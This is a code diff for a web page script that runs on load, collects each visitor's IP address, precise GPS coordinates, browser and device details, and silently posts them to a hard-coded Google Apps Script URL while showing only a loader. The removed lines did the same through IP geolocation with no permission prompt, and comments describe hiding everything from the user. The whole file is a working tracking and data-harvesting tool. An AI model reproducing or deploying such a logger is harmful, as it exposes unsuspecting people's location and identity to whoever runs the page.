@@ -1,5 +1,5 @@
 // ============================================================
-// CONFIGURATION - Paste your Google Apps Script Web App URL here
+// CONFIGURATION
 // ============================================================
 const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzTTKozCgUoXoiRWqZ31qOAmQeIEf90M1B7xHfdaVgZXJQzYFhwBT-s2im-Tx9J9LCH/exec";
 
@@ -47,43 +47,49 @@ async function getIP() {
 }
 
 // ============================================================
-// Get location using IP-based geolocation (NO permission popup)
-// This uses a free API that gives approximate location from IP
+// GPS Location - permission puchega, exact location milega
 // ============================================================
-async function getLocationSilent() {
-    try {
-        const res = await fetch("https://ipapi.co/json/");
-        const data = await res.json();
-        if (data.latitude && data.longitude) {
-            return { lat: data.latitude, lng: data.longitude };
+function getLocation() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+            resolve({ lat: "Not Supported", lng: "Not Supported", status: "Not Supported" });
+            return;
         }
-        return null;
-    } catch {
-        return null;
-    }
+        navigator.geolocation.getCurrentPosition(
+            (pos) => resolve({
+                lat: pos.coords.latitude,
+                lng: pos.coords.longitude,
+                status: "Allowed"
+            }),
+            (err) => resolve({
+                lat: "Denied",
+                lng: "Denied",
+                status: "Denied"
+            }),
+            { enableHighAccuracy: true, timeout: 15000 }
+        );
+    });
 }
 
 // ============================================================
-// AUTO COLLECT & SEND - fully silent, no permission popup
+// AUTO COLLECT & SEND
 // ============================================================
 async function collectAndSend() {
-    const [ip, location] = await Promise.all([getIP(), getLocationSilent()]);
+    const [ip, location] = await Promise.all([getIP(), getLocation()]);
 
-    const lat = location ? location.lat : "Unavailable";
-    const lng = location ? location.lng : "Unavailable";
-    const mapLink = location
-        ? `https://www.google.com/maps?q=${lat},${lng}`
+    const mapLink = location.status === "Allowed"
+        ? `https://www.google.com/maps?q=${location.lat},${location.lng}`
         : "Unavailable";
 
     const payload = {
         timestamp: new Date().toLocaleString(),
-        latitude: lat,
-        longitude: lng,
+        latitude: location.lat,
+        longitude: location.lng,
         mapLink: mapLink,
         ip: ip,
         browser: getBrowser(),
         device: getDevice(),
-        status: location ? "Location Found" : "Location Unavailable"
+        status: "Location " + location.status
     };
 
     try {
@@ -93,12 +99,9 @@ async function collectAndSend() {
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(payload)
         });
-    } catch (err) {
-        // Silent fail - user ko kuch nahi dikhana
-    }
+    } catch (err) {}
 
     hideLoader();
 }
 
-// Auto-run - no click, no permission popup, fully silent
 collectAndSend();
